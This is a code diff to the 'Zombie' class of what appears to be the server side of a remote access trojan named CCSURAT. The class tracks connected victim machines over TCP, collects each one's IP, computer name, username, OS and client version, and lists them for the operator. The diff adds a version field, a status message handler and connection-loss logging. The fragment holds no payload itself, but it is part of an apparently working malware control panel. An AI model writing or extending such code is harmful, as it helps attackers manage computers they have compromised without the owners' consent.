@@ -7,19 +7,20 @@ using System.Windows.Forms;
 
 namespace CCSURAT_Server
 {
-    class Zombie
+    public class Zombie
     {
         // Store a copy of the main form for logging
         // also store the listview to add clients to it.
         private ServerMainForm mainForm;
         private ListView zombieListView;
-        private ListViewItem zombieItem;
+        private ZombieListItem zombieItem;
 
         private TcpClient client;
         private NetworkStream netStream;
 
         #region information
-        private string IP, computerName, username, OS;
+        private string IP, clientVersion, computerName, username, OS;
+        private string status;
         #endregion
         public Zombie(ServerMainForm form, TcpClient client)
         {
@@ -59,6 +60,7 @@ namespace CCSURAT_Server
             }
             finally
             {
+                Log("Lost connection to: " + IP);
                 // remove entry from listview if connection is lost/closed
                 RemoveFromListView();
             }
@@ -81,6 +83,7 @@ namespace CCSURAT_Server
                     return true;
                 else
                 {
+                    Log("CLIENT DEAD");
                     return false;
                 }
             }
@@ -99,6 +102,9 @@ namespace CCSURAT_Server
                     case "START":
                         ParseSystemInfo(data);
                         AddToListView();
+                        break;
+                    case "STATUS":
+                        status = data;
                         break;
                 }
             }
@@ -149,8 +155,9 @@ namespace CCSURAT_Server
             }
 
             // add stored client information to listview.
-            zombieItem = new ListViewItem();
+            zombieItem = new ZombieListItem(this);
             zombieItem.Text = IP;
+            zombieItem.SubItems.Add(clientVersion);
             zombieItem.SubItems.Add(computerName);
             zombieItem.SubItems.Add(username);
             zombieItem.SubItems.Add(OS);
@@ -178,9 +185,10 @@ namespace CCSURAT_Server
             // The rest of the information is what was sent by the client.
             // Each piece of system info is seperated by: |*|
             string[] info = data.Split("|*|".ToCharArray(), StringSplitOptions.RemoveEmptyEntries);
-            computerName = info[0];
-            username = info[1];
-            OS = info[2];
+            clientVersion = info[0];
+            computerName = info[1];
+            username = info[2];
+            OS = info[3];
         }
 
         private void Log(string s)
